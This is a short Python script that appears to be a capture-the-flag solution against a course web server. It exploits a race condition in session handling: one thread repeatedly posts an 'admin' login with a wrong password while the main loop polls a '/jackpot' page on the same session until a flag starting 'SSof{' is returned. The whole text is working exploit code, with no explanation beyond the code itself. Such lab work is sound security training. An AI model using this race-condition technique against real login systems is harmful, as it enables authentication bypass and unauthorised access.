from requests import Session
from threading import Thread

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23652/"

session = Session()

def login():
    while True:
        session.post(link + "login", data={"username": "admin", "password": "a"})

Thread(target=login, daemon=True).start()

while True:
    r = session.get(link + "jackpot")
    if "SSof{" in r.text:
        print(r.text)
        break